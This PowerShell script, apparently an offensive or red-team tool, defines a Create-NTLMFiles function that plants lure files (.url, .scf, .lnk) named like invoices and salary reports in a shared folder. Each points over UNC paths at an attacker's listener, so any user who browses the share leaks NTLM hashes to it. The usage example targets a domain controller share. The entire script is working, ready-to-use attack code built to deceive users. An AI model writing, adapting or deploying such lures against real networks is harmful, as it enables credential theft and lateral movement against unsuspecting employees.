<#
.SYNOPSIS
    This script creates files designed to coerce NTLM authentication when accessed by a user.

.DESCRIPTION
    The Create-NTLMFiles function generates three types of files (.url, .scf, .lnk) in a specified directory.
    These files are configured to point to the defined listener, which can capture NTLM hashes from the accessing user's machine.

.PARAMETER Path
    The directory where the malicious files will be created.

.PARAMETER Listener
    The IP address or hostname of the server configured to capture NTLM hashes.

.EXAMPLE
    Create-NTLMFiles -Path "\\DC01\AllUserShare\" -Listener "10.10.10.7"
    This example creates the malicious files in the specified directory, pointing to a listener at 10.10.10.7.
#>

function Create-NTLMFiles {
    param (
        [string]$Path,
        [Parameter(Mandatory=$true)]
        [string]$Listener
    )

    if (-Not (Test-Path -Path $Path)) {
        Write-Host "The provided path does not exist."
        exit
    }

    $urlFilePath = Join-Path -Path $Path -ChildPath "Invoice_June2024.url"
    "[InternetShortcut]`nURL=\\$Listener\share" | Out-File -FilePath $urlFilePath -Encoding ASCII

    $scfFilePath = Join-Path -Path $Path -ChildPath "All_Staff_Salary_Grades.scf"
    "[Shell]`nCommand=2`nIconFile=\\$Listener\share\icon.ico`n[Taskbar]`nCommand=ToggleDesktop" | Out-File -FilePath $scfFilePath -Encoding ASCII

    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut((Join-Path -Path $Path -ChildPath "Salary_Report_2024.lnk"))
    $shortcut.TargetPath = "\\\\$Listener\\share"
    $shortcut.IconLocation = "\\\\$Listener\\share\\icon.ico"
    $shortcut.Save()

    Write-Host "Files have been created in the directory: $Path"
    Write-Warning "Don't forget to tidy up later!"
}
